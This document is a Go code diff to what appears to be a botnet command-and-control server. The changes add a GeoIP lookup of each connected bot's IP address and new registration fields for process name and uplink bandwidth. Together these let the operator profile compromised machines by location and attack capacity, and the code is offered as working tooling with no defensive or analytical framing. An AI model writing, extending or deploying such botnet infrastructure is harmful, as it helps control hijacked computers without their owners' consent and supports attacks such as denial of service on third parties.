@@ -5,9 +5,12 @@ import (
 	"crypto/md5"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"strings"
 	"time"
@@ -169,6 +172,63 @@ func randomChallenge(length int) string {
 }
 
 // ============================================================================
+// GEOIP LOOKUP
+// Uses ip-api.com free API to resolve country from bot IP address.
+// Falls back to "??" on error. Caches nothing (one lookup per bot connect).
+// ============================================================================
+
+// geoIPResponse holds the JSON response from ip-api.com
+type geoIPResponse struct {
+	Status      string `json:"status"`
+	Country     string `json:"country"`
+	CountryCode string `json:"countryCode"`
+	City        string `json:"city"`
+	ISP         string `json:"isp"`
+}
+
+// lookupGeoIP resolves country code from an IP:port address string.
+// Uses ip-api.com free tier (45 req/min, no key needed).
+// Returns 2-letter country code (e.g., "US", "DE") or "??" on failure.
+func lookupGeoIP(remoteAddr string) string {
+	// Extract IP from IP:port
+	host, _, err := net.SplitHostPort(remoteAddr)
+	if err != nil {
+		host = remoteAddr
+	}
+
+	// Skip private/localhost IPs
+	ip := net.ParseIP(host)
+	if ip == nil || ip.IsLoopback() || ip.IsPrivate() {
+		return "LO"
+	}
+
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,countryCode,country,city,isp", host))
+	if err != nil {
+		logMsg("[GEO] Lookup failed for %s: %v", host, err)
+		return "??"
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "??"
+	}
+
+	var geo geoIPResponse
+	if err := json.Unmarshal(body, &geo); err != nil {
+		return "??"
+	}
+
+	if geo.Status != "success" {
+		return "??"
+	}
+
+	logMsg("[GEO] %s -> %s (%s, %s - %s)", host, geo.CountryCode, geo.Country, geo.City, geo.ISP)
+	return geo.CountryCode
+}
+
+// ============================================================================
 // BOT MANAGEMENT FUNCTIONS
 // These functions manage the lifecycle of bot connections including
 // registration, removal, cleanup, and tracking of bot metadata.
@@ -180,7 +240,7 @@ func randomChallenge(length int) string {
 // Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
 // Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
 // Maintains both new map-based storage and legacy slice for backwards compatibility
-func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int) {
+func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int, processName string, uplinkMbps float64, country string) {
 	botConnsLock.Lock()
 	defer botConnsLock.Unlock()
 
@@ -203,7 +263,10 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCo
 		ip:            conn.RemoteAddr().String(),
 		ram:           ram,
 		cpuCores:      cpuCores,
-		userConn:      nil, // No user controlling initially
+		processName:   processName,
+		uplinkMbps:    uplinkMbps,
+		country:       country,
+		userConn:      nil,
 	}
 
 	botConnections[botID] = botConn
@@ -213,8 +276,8 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCo
 	// Notify TUI of connection
 	LogBotConnection(arch, true)
 
-	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | IP: %s | Total: %d",
-		botID, arch, ram, cpuCores, conn.RemoteAddr(), botCount)
+	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | Proc: %s | Uplink: %.1fMbps | Country: %s | IP: %s | Total: %d",
+		botID, arch, ram, cpuCores, processName, uplinkMbps, country, conn.RemoteAddr(), botCount)
 }
 
 // removeBotConnection cleanly removes a bot from all tracking structures
@@ -403,7 +466,7 @@ func handleBotConnection(conn net.Conn) {
 	if len(parts) > 3 {
 		arch = parts[3]
 	}
-	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram:cpu
+	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram:cpu:procname:uplink
 	var ram int64 = 0
 	if len(parts) > 4 {
 		fmt.Sscanf(parts[4], "%d", &ram)
@@ -413,6 +476,19 @@ func handleBotConnection(conn net.Conn) {
 	if len(parts) > 5 {
 		fmt.Sscanf(parts[5], "%d", &cpuCores)
 	}
+	// Parse process name
+	processName := "unknown"
+	if len(parts) > 6 {
+		processName = parts[6]
+	}
+	// Parse uplink speed (Mbps)
+	var uplinkMbps float64 = 0.0
+	if len(parts) > 7 {
+		fmt.Sscanf(parts[7], "%f", &uplinkMbps)
+	}
+
+	// GeoIP lookup from bot's IP
+	country := lookupGeoIP(conn.RemoteAddr().String())
 
 	// Your existing version check
 	if version != PROTOCOL_VERSION {
@@ -422,7 +498,7 @@ func handleBotConnection(conn net.Conn) {
 	}
 
 	// Add bot to connections
-	addBotConnection(conn, botID, arch, ram, cpuCores)
+	addBotConnection(conn, botID, arch, ram, cpuCores, processName, uplinkMbps, country)
 
 	// Reset deadline for normal operation
 	conn.SetDeadline(time.Time{})
